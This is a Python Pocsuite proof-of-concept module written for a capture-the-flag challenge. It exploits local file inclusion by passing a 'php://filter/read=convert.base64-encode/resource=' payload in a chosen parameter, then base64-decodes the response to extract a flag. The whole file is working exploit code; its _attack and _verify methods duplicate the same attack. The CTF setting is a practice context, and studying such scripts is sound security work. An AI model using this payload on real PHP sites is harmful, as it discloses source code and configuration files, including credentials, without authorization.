import re
import urlparse
import base64
from pocsuite.net import req
from pocsuite.poc import POCBase,Output
from pocsuite.utils import register

class TestPOC(POCBase):
    appName='CTF'
    name='LocalFileInclude'
    vulID='00000'
    version='1.0'
    author='LzSkyline'
    vulDate='0000-00-00'
    createDate='2017-09-25'
    updateDate='2017-09-25'
    references=['https://www.seebug.org/vuldb/ssvid-00000']
    appPowerLink='https://www.lzskyline.com'
    appVersion='0.0.0'
    vulType='Others'
    desc='https://www.seebug.org/'
    samples=['http://4.chinalover.sinaapp.com/web7/']

    def _attack(self):
        # if not self.params["target"]: return
        result={}
        vulurl=self.url
        payload=r'php://filter/read=convert.base64-encode/resource=' + self.params["target"]
        param={self.params["var"]:payload}
        resp=req.get(vulurl,params=param)

        match_result=re.search(self.params['name'] + '{(.*)}',resp.content)
        if match_result:
            result['FlagInfo']={}
            result['FlagInfo']['Flag']=self.params['name'] + "{" + match_result.group(1) + "}"
        else:
            tmp = base64.b64decode(re.sub("<.*>?","",resp.content))
            match_result = re.search(self.params['name'] + '{(.*)}', tmp)
            if match_result:
                result['FlagInfo']={}
                result['FlagInfo']['Flag']=self.params['name'] + "{" + match_result.group(1) + "}"
        return self.parse_attack(result)

    def _verify(self):
        # if not self.params["target"]: return
        result={}
        vulurl=self.url
        payload=r'php://filter/read=convert.base64-encode/resource=' + self.params["target"]
        param={self.params["var"]:payload}
        resp=req.get(vulurl,params=param)
        match_result=re.search(self.params['name'] + '{(.*)}',resp.content)
        if match_result:
            result['FlagInfo']={}
            result['FlagInfo']['Flag']=self.params['name'] + "{" + match_result.group(1) + "}"
        else:
            tmp = base64.b64decode(re.sub("<.*>?","",resp.content))
            match_result = re.search(self.params['name'] + '{(.*)}', tmp)
            if match_result:
                result['FlagInfo']={}
                result['FlagInfo']['Flag']=self.params['name'] + "{" + match_result.group(1) + "}"
        return self.parse_attack(result)

    def parse_attack(self,result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output

        
register(TestPOC)
        
